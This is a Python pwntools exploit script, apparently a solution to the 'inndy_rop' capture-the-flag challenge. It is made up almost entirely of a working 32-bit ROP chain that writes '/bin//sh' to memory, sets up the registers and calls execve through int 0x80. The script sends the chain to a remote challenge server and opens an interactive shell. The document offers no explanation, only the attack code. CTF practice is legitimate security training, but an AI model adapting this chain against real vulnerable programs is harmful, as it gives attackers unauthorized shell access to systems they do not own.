from pwn import *
from struct import pack


def inndy_rop(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/inndy_rop'):
    print('inndy_rop start')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 25571)

    p = b'a' * 16

    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'/bin'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea064)  # @ .data + 4
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9)  # pop ebx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080de769)  # pop ecx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0806c943)  # int 0x80

    # gdb.attach(target)
    target.sendline(p)
    target.interactive()

    print('inndy_rop end')


if __name__ == '__main__':
    inndy_rop()
